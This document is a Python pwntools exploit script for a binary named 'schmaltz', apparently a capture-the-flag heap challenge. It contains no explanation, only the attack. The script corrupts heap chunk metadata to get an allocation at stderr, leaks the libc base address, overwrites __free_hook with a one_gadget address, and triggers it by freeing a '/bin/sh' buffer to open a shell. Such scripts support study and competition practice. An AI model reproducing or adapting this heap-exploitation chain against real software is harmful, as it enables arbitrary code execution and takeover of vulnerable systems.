#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./schmaltz")
p = process("./schmaltz")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc.so.6")

def malloc(size,content):
    p.sendlineafter("> ","1")
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.send(content)

def free(index):
    p.sendlineafter("> ","4")
    p.recvline()
    p.sendline(str(index))

def view(index):
    p.sendlineafter("> ","3")
    p.recvline()
    p.sendline(str(index))
    p.recvuntil("Content: ")
    leak = p.recvline()[:-1]
    return leak

fake = 0x602040 #(stderr)
malloc(264,'a'*8)
malloc(264,'b'*8)
free(1)
free(0)
malloc(264,b'a'*256+p64(0x0))
free(1)
malloc(248,p64(fake))
malloc(264,'a'*8)
malloc(264,b'\x80')
leak = view(2)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - libc.sym._IO_2_1_stderr_
log.critical("Libc base address: {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
one_gadget = libc.address + 0xe0021

malloc(296,'a'*8)
malloc(296,'b'*8)
free(4)
free(3)
malloc(296,b'a'*288+p64(0x0))
free(4)
malloc(296,p64(__free_hook))
malloc(248,b'a'*8)
malloc(248,p64(one_gadget))
malloc(248,b"/bin/sh\x00")
free(5)
p.interactive()